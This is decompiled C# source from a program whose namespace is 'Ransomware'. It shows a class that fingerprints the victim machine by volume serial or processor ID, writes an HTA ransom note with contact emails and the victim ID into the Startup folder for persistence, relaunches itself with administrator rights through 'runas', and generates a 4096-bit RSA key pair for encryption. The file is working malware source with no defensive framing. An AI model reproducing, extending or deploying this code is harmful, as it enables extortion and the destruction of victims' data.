using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using Ransomware.Properties;
using winlogon;

namespace Ransomware;

public class ServerConnection
{
	public static string GetID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
		val.Get();
		if (!string.IsNullOrEmpty(((ManagementBaseObject)val)["VolumeSerialNumber"].ToString()))
		{
			return ((ManagementBaseObject)val)["VolumeSerialNumber"].ToString();
		}
		string text = string.Empty;
		ManagementObjectEnumerator enumerator = new ManagementClass("Win32_Processor").GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.Current;
				if (text == string.Empty)
				{
					text = ((ManagementBaseObject)val2).Properties["ProcessorId"].Value.ToString();
				}
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void StartUPAdd()
	{
		try
		{
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\info.hta", Resources.info.Replace("_email2_", config.Email_2).Replace("_email1_", config.Email_1).Replace("_id_", GetID()));
		}
		catch
		{
		}
	}

	public static void RequireAdministratorAccess()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					Verb = "runas",
					UseShellExecute = true,
					FileName = Assembly.GetExecutingAssembly().Location
				};
				process.Start();
				Environment.Exit(0);
			}
			catch
			{
			}
		}
	}

	public static void GenerateAndSaveRSAKeys()
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(4096);
		try
		{
			string contents = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
			File.WriteAllText("public_key.xml", contents);
			string contents2 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
			File.WriteAllText("private_key.xml", contents2);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}
}
